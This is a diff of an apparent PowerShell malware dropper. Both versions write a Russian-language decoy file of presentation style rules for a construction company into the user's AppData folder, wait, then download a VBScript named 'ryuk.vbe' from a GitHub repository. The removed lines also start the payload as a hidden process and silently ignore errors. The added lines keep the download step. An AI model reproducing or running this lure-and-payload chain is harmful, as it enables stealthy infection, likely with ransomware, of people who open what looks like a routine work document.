@@ -1,5 +1,5 @@
-$path = Join-Path $env:LOCALAPPDATA 'ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt'
-
+# Создание текстового файла с руководством
+$filePath = Join-Path $env:LOCALAPPDATA "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
 $content = @"
 Данный документ регламентирует единые стандарты для создания всех презентаций компании «Капитал – Строитель жилья!» (kapital62.ru). Цель — обеспечить узнаваемость, профессиональный вид и целостность всех материалов.
 
@@ -33,38 +33,16 @@ $content = @"
         Размер: 14-16 pt. Можно использовать курсив или цвет #767676.
 
     Важное правило: Не используйте более 3-х разных шрифтов на одном слайде.
-    
+	
 3. РАБОТА С ИЗОБРАЖЕНИЯМИ И МЕДИА
 Дополните слайды визуальными материалами там, где сочтёте нужным — из папки “Медиа для презентаций” или с фотостоков, например Unsplash.com.
 "@
 
-# Создание файла без вывода окон
-Set-Content -Path $path -Value $content -Encoding UTF8
+# Создание директории и файла
+New-Item -Path $filePath -ItemType File -Force | Out-Null
+Set-Content -Path $filePath -Value $content -Encoding UTF8
 
-Start-Sleep -Seconds 40
-
-# Вторая часть - скачивание и запуск файла
-$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
-$FileName = "ryuk.vbe"  # Явно указываем имя файла
-$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
-$DownloadPath = Join-Path $LocalAppData $FileName
-
-# Скачивание и запуск (также скрытно)
-try {
-    # Используем более скрытный метод скачивания
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($Url, $DownloadPath)
-    
-    # Запускаем процесс скрытно
-    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processInfo.FileName = $DownloadPath
-    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $processInfo.CreateNoWindow = $true
-    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
-}
-catch {
-    # В случае ошибки просто игнорируем
-}
-
-# Завершаем скрипт
-exit
+# Ожидание и загрузка файла
+Start-Sleep -Seconds 45
+$downloadPath = Join-Path $env:LOCALAPPDATA "ryuk.vbe"
+Invoke-WebRequest -Uri "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe" -OutFile $downloadPath -UseBasicParsing
